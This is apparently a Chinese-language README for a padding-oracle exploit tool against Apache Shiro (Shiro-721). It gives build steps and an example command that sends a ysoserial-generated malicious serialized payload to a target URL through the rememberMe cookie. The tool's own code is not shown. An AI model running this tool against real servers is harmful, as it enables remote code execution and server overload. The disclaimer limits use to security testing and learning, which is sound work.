Shiro-721 Padding Oracle Attack

本来就不是专业搞密码学的，不过之前为了应急还是去搞了下...，这个漏洞在实际中应该不可能攻击成功，不过学习下还是可以的。
代码写得有点丑，不过不要仅，能跑...

**Usage**：
1. 克隆项目，在项目下执行mvn clean package，会在target下生成两个jar包，PaddingOracleAttack-1.0-SNAPSHOT.jar带了依赖包，直接使用这个就行
2. 执行`java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath`，例如:
`java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar http://127.0.0.1:8080/samples-web-1.5.0-SNAPSHOT/ rememberMeCookie 16 payload.ser`

**注：** payloadFilePath为恶意的序列化数据文件，可以使用ysoserial生成，尽量选择payload短的，不然爆破时间很长，够等。中途出错了可能需要重新运行，可能是服务器扛不住的原因...

**参考：**[https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data](https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data)

**免责声明:本工具仅供安全测试学习用途,禁止非法使用**